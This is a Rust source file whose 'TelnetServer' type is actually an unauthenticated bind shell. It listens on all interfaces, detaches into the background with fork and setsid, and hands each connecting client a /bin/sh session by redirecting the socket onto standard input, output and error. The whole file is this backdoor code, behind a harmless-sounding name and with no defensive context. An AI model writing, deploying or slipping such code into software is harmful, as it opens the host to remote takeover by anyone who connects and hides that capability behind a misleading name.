extern crate libc;

use core::mem::{MaybeUninit, size_of};

#[derive(Copy, Clone, Debug)]
pub struct Errno(pub i32);

pub struct TelnetServer {
    listen_fd: libc::c_int,
}

impl TelnetServer {
    pub fn new(port: u16) -> Result<Self, Errno> {
        unsafe {
            let fd = libc::socket(libc::AF_INET, libc::SOCK_STREAM, 0);
            if fd < 0 {
                return Err(Errno(*libc::__errno_location()));
            }

            let yes: libc::c_int = 1;
            libc::setsockopt(
                fd,
                libc::SOL_SOCKET,
                libc::SO_REUSEADDR,
                &yes as *const _ as *const libc::c_void,
                size_of::<libc::c_int>() as _,
            );

            let mut addr: libc::sockaddr_in = core::mem::zeroed();
            addr.sin_family = libc::AF_INET as _;
            addr.sin_port = port.to_be();
            addr.sin_addr = libc::in_addr {
                s_addr: { libc::INADDR_ANY.to_be() },
            };

            if libc::bind(fd, &addr as *const _ as *const libc::sockaddr, size_of::<libc::sockaddr_in>() as _) < 0 {
                let e = *libc::__errno_location();
                libc::close(fd);
                return Err(Errno(e));
            }

            if libc::listen(fd, 16) < 0 {
                let e = *libc::__errno_location();
                libc::close(fd);
                return Err(Errno(e));
            }

            Ok(TelnetServer { listen_fd: fd })
        }
    }

    pub fn run_forked(&self) -> Result<(), Errno> {
        unsafe {
            let pid = libc::fork();
            if pid < 0 {
                return Err(Errno(*libc::__errno_location()));
            }

            if pid > 0 {
                return Ok(());
            }

            if libc::setsid() < 0 {
                libc::_exit(1);
            }

            self.run()
        }
    }

    fn run(&self) -> ! {
        loop {
            let mut peer = MaybeUninit::<libc::sockaddr_in>::uninit();
            let mut len = size_of::<libc::sockaddr_in>() as libc::socklen_t;

            unsafe {
                let cfd = libc::accept(self.listen_fd, peer.as_mut_ptr() as *mut _, &mut len);

                if cfd < 0 {
                    continue;
                }

                self.spawn_shell(cfd);
                libc::close(cfd);

                reap_children();
            }
        }
    }

    unsafe fn spawn_shell(&self, sock: libc::c_int) {
        unsafe {
            let pid = libc::fork();
            if pid != 0 {
                return;
            }

            // child
            libc::dup2(sock, 0);
            libc::dup2(sock, 1);
            libc::dup2(sock, 2);

            let path = b"/bin/sh\0";
            let argv = [path.as_ptr(), core::ptr::null()];

            libc::execve(path.as_ptr() as *const _, argv.as_ptr() as *const _, core::ptr::null());

            libc::_exit(127);
        }
    }
}

unsafe fn reap_children() {
    let mut status: libc::c_int = 0;
    unsafe { while libc::waitpid(-1, &mut status, libc::WNOHANG) > 0 {} }
}
